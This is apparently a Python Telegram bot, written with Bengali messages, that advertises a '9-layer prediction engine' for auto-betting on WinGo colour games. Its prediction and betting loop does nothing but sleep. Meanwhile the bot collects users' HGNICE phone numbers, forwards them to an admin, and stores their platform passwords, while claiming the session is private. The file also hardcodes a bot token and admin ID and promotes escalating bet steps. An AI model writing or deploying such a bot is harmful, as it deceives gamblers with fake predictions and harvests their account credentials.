import os
import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ⚠️ আপনার নতুন বটের API TOKEN নিচে বসান
BOT_TOKEN = "8402123136:AAFWrnsg-qaigbHfqna5ZmjJUz3YJv1dNs4"
ADMIN_ID = 8164888241  # আপনার টেলিগ্রাম আইডি

user_states = {}

def get_state(uid):
    if uid not in user_states:
        user_states[uid] = {
            "logged_in": False,
            "awaiting": None,
            "phone": "",
            "password": "",
            "game": None,
            "steps": [],
            "step_idx": 0,
            "target": 0,
            "profit": 0,
            "running": False,
            "task": None,
        }
    return user_states[uid]

async def auto_bet_loop(uid, ctx):
    state = get_state(uid)
    try:
        while state["running"]:
            await asyncio.sleep(28)
            if not state["running"]:
                break
    except asyncio.CancelledError:
        pass

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = get_state(uid)

    text = (
        "🧠 Prediction Engine — 9 Layers\n"
        "⚡ Streak • 🔷 Pattern • 📈 Trend\n"
        "🔍 Manipulation • 🎨 Colour • 🔢 Frequency\n"
        "🔄 Markov • ♻️ Cycle • 💎 Momentum\n\n"
        "🔄 Every layer is back-tested live so its vote weight follows its real hit-rate\n"
        "🔴 Confidence below 30% → sit out\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎬 4-second 🧠 generating prediction animation\n"
        "🚀 Analysis → auto bet every 30s period\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 Press the button below to LOGIN"
    )

    keyboard = [[
        InlineKeyboardButton("🔐 LOGIN TO ACCOUNT", callback_data="start_login")
    ]]

    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True
    )

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "No Username"
    name = update.effective_user.first_name or "User"
    state = get_state(uid)
    text = update.message.text.strip()

    # ১. ইউজার যখন ফোন নম্বর দেবে
    if state.get("awaiting") == "phone":
        state["phone"] = text
        state["awaiting"] = "pending_approval"
        
        await update.message.reply_text(
            "⏳ আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
        )

        admin_text = (
            "🔔 NEW LOGIN REQUEST!\n\n"
            f"👤 Name: {name}\n"
            f"🆔 User ID: {uid}\n"
            f"🔗 Username: @{username}\n"
            f"📱 Phone: {text}"
        )
        admin_keyboard = [[
            InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{uid}")
        ]]
        
        try:
            await ctx.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_text,
                reply_markup=InlineKeyboardMarkup(admin_keyboard)
            )
        except Exception as e:
            print(f"Failed to send message to admin: {e}")
            await update.message.reply_text("⚠️ অ্যাডমিনকে মেসেজ পাঠানো যায়নি! নিশ্চিত করুন অ্যাডমিন আইডি থেকে বটটি একবার /start করা হয়েছে।")
        return

    # ২. অ্যাডমিন অ্যাপ্রুভ করার পর ইউজার যখন পাসওয়ার্ড দেবে
    if state.get("awaiting") == "waiting_password":
        state["password"] = text
        state["logged_in"] = True
        state["awaiting"] = None

        keyboard = [
            [
                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
            ],
            [
                InlineKeyboardButton("🕐 WinGo 3m", callback_data="game_3m"),
                InlineKeyboardButton("🕔 WinGo 5m", callback_data="game_5m"),
            ],
        ]
        await update.message.reply_text(
            "✅ পাসওয়ার্ড সফলভাবে গৃহিত হয়েছে এবং একাউন্ট যুক্ত হয়েছে!\n\n🎯 গেম সিলেক্ট করুন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    # ৩. গেমের স্টেপস সেট করা
    if state["logged_in"]:
        if state.get("awaiting") == "steps":
            try:
                parts = [float(x.strip()) for x in text.replace(" ", "").split(",")]
                parts = [p for p in parts if p > 0]
                state["steps"] = parts
                state["step_idx"] = 0
                state["awaiting"] = "target"
                await update.message.reply_text(
                    "✅ STEPS SAVED\n🎯 এখন TARGET PROFIT দিন (যেমন: 500):"
                )
            except:
                await update.message.reply_text(
                    "❌ ভুল ফরম্যাট! 10,20,40,80,160 এভাবে লিখুন"
                )
            return

        # ৪. টার্গেট প্রফিট সেট করা
        if state.get("awaiting") == "target":
            try:
                tgt = float(text)
                state["target"] = tgt
                state["awaiting"] = None
                state["profit"] = 0
                state["running"] = True
                await update.message.reply_text(
                    f"🚀 AUTO BETTING STARTED!\n🎯 Target: {tgt}\n⏳ অপেক্ষা করুন...",
                )
                if state.get("task"):
                    state["task"].cancel()
                state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
            except:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 500")
            return

async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    state = get_state(uid)
    data = query.data

    if data == "start_login":
        state["awaiting"] = "phone"
        login_text = (
            "╔═══════════════════════════════╗\n"
            "║        🔐 ACCOUNT LOGIN 🔐        ║\n"
            "╚═══════════════════════════════╝\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📱 Enter your HGNICE phone number:\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Everyone uses their own account — your session is private."
        )
        await query.message.reply_text(login_text)

    elif data.startswith("approve_"):
        target_uid = int(data.split("_")[1])
        target_state = get_state(target_uid)
        target_state["awaiting"] = "waiting_password"

        try:
            await query.edit_message_text(f"{query.message.text}\n\n✅ APPROVED!")
        except:
            pass

        try:
            await ctx.bot.send_message(
                chat_id=target_uid,
                text="✅ ADMIN APPROVED YOUR ACCOUNT!\n\n🔑 এখন আপনার প্ল্যাটফর্মের পাসওয়ার্ডটি দিন:",
            )
        except Exception as e:
            print(f"User notify error: {e}")

    elif data.startswith("game_"):
        if not state["logged_in"]:
            await query.message.reply_text("❌ আগে নম্বর ও পাসওয়ার্ড দিয়ে লগইন সম্পন্ন করুন।")
            return
        mode = data.split("_")[1]
        state["game"] = mode
        state["awaiting"] = "steps"
        await query.edit_message_text(
            f"🎮 WinGo {mode.upper()} SELECTED\n\n"
            f"💰 BET STEPS লিখুন:\nExample: 10,20,40,80,160",
        )

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_NEW_BOT_TOKEN_HERE":
        print("Error: সঠিক BOT_TOKEN বসান!")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
